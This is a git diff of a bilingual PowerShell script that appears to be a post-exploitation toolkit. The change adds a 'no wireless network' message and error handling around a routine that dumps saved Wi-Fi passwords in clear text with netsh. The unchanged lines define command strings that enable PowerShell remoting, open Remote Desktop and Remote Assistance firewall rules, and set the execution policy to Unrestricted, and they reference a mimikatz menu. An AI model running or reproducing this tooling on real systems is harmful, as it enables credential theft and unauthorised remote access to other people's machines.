@@ -135,6 +135,7 @@ if($Language -in 'English') {
   $txt57 = "Enter the number of ports to scan (25-1000):` "
   $txt58 = "All User Profile"
   $txt59 = "Recover Wi-Fi passwords"
+  $txt60 = "There is no wireless network on this computer"
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet *' -NetworkCategory Private; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi *' -NetworkCategory Private; winrm quickconfig -quiet; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group = 'Remote Assistance' new enable = Yes; netsh advfirewall firewall set rule group='Remote Desktop' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group = 'Network Discovery' new enable = Yes; netsh advfirewall firewall set rule group = 'Remote Scheduled Tasks Management' new enable = yes"
@@ -202,6 +203,7 @@ if($Language -in 'Spanish') {
   $txt57 = "Introduce la cantidad de puertos a escanear (25-1000):` "
   $txt58 = "Perfil de todos los usuarios"
   $txt59 = "Recuperar contraseñas Wi-Fi"
+  $txt60 = "No existe ninguna red inalámbrica en este equipo"
   $Pwn1  = "Set-NetConnectionProfile -InterfaceAlias 'Ethernet*' -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias 'Wi-Fi*' -NetworkCategory Private ; winrm quickconfig -quiet ; Enable-PSRemoting -Force"
   $Pwn2  = "netsh advfirewall firewall set rule group='Asistencia Remota' new enable=Yes ; netsh advfirewall firewall set rule group='Escritorio Remoto' new enable=yes ; Set-ExecutionPolicy Unrestricted -Force"
   $Pwn3  = "netsh advfirewall firewall set rule group='Detección de redes' new enable=Yes ; netsh advfirewall firewall set rule group='Administración Remota de tareas programadas' new enable=yes"
@@ -355,7 +357,8 @@ if($Language -in 'Spanish') {
         $wlans = netsh wlan show profiles | Select-String -Pattern "$txt58" | Foreach-Object {$_.ToString()}
         $exportdata = $wlans | Foreach-Object {$_.Replace("    $txt58     : ",$null)}
         $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}}
-	Get-Wlan-Keys ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause }
+	$wifikey = Get-Wlan-Keys ; if (!($wifikey -like "*Wi-Fi*")){ Write-Host "$txt60" -ForegroundColor Red ; sleep -milliseconds 4000 } 
+	else { $wifikey ; $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause }}
 	
         if($mimikatz -like 'X'){ $input = 'x' ; continue }
         if($mimikatz -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}
